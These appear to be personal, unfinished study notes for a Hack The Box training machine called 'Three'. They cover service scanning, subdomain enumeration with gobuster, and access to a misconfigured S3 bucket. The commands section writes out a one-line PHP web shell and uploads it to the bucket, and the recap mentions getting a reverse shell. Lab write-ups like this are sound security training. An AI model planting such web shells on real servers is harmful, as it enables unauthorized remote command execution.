# Three

[Walkthrough](blob:https://app.hackthebox.com/a6031c7b-6eea-4293-9aa0-097ca0ca3568)
[Solutions - CryptoCat](https://www.youtube.com/watch?v=sV9M4LKKT9s)

Goal: 

## Concepts Learned

- If we don't have a DNS server, we can add the IP address of the url to `etc/hosts`
- sub-domain enumeration: 

**Programs**

- `SecLists`:
- `awscli`: interact with Amazon S3 bucket
- `gobuster`: find hidden pages on website [here1](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/) [here2](https://sohvaxus.github.io/content/gobuster.html)

**Commands**

```
nmap -sV 10.129.4.11
echo "10.129.4.11 thetoppers.htb" | sudo tee -a /etc/hosts

gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb

aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb


```

**Recap**

1. We use nmap to check for open port. We see two ports: one using ssh and one 
   using http
2. We check the browser. We find that the domain is `thetopper.htb` and add it 
   to the hosts
3. We run gobuster and find that there is a subdomain `S3`. This is an Amazon 
   cloud-based object storage. We can configure the bucket using `aws configure`
4. We connect to aws endpoint s3 bucket and we copy a script to get the 
   system command
5. We use curl and python server to fetch the reverse shell


INCOMPLETE + TO REVIEW
